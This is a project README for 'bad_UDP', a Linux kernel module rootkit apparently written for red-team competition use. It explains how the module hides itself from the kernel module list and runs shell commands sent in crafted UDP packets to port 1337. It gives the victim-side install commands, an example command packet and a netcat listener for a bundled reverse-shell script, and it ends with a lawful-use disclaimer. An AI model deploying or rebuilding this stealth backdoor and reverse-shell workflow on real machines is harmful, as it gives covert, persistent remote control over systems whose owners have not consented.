# bad_UDP LKM Rootkit
## The goal of this rootkit is to allow an attacker/pentester to maintain persistence by execute remote commands via UDP. Once loaded, the LKM acts as a ring-0 UDP packet interceptor via a netfilter hook in the pre-routing routine. In addition, this module will hide itself by modifying the Linux kernel module list structure. Tested on Linux kernel v5.0.0

#### Once the kernel module is installed you can launch a remote command via sending a crafted UDP packet to the vitim on port 1337. Example packet:
```runcmd echo 'Hello World' > /root/hello.txt\r\n```  (Note that your packet must begin with ```runcmd ``` followed by your desired shell command. A carriage return (```\r\n```) MUST be included at the end of your remote command)


## Installation

### ON VICTIM MACHINE:
```
sudo make
sudo insmod bad_udp.ko
```


I've included a python script ```send_reverse_tcp_shell.py``` which will send a remote command to the victim opening a reverse bash TCP shell. Ensure you have a listener running as your shell server before running the python script (eg. netcat listener ```nc -lvp 4444```)


#### This LKM rootkit was written for the CFC competition red team members and is intdended to be used for lawful purposes only. You are responsible for your own actions and consequences if you use this module illegally.